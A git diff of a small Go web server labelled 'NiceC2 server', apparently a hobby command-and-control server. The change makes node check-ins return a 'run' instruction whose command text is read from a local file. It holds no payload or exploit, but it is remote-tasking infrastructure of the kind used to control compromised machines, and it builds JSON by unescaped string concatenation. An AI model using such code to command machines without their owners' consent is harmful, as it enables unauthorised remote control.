@@ -3,8 +3,10 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
+	"strings"
 	"time"
 
 	"github.com/gorilla/mux"
@@ -44,11 +46,14 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
 	//JSON reponse
 
+	// Get a new command
+	Command := refresh_commands()
+
 	var response = []byte(`
 	{
 		"ID": "` + node.ID + `", 
 		"command": "run", 
-		"details": "say 'Oooh it works'"
+		"details": "` + Command + `"
 	}`)
 
 	fmt.Println(response)
@@ -70,9 +75,23 @@ func handleRequests() {
 }
 
 func main() {
+
+	fmt.Println("NiceC2 server")
+
 	handleRequests()
 }
 
 func shrug() {
 	fmt.Println("🤷")
+}
+
+func refresh_commands() string {
+
+	//Reading the command file, this will be JSON at some point I reckon
+
+	bFile, _ := ioutil.ReadFile("command.txt")
+	command := string(bFile)
+	command = strings.Replace(command, "\n", "", -1)
+
+	return command
 }
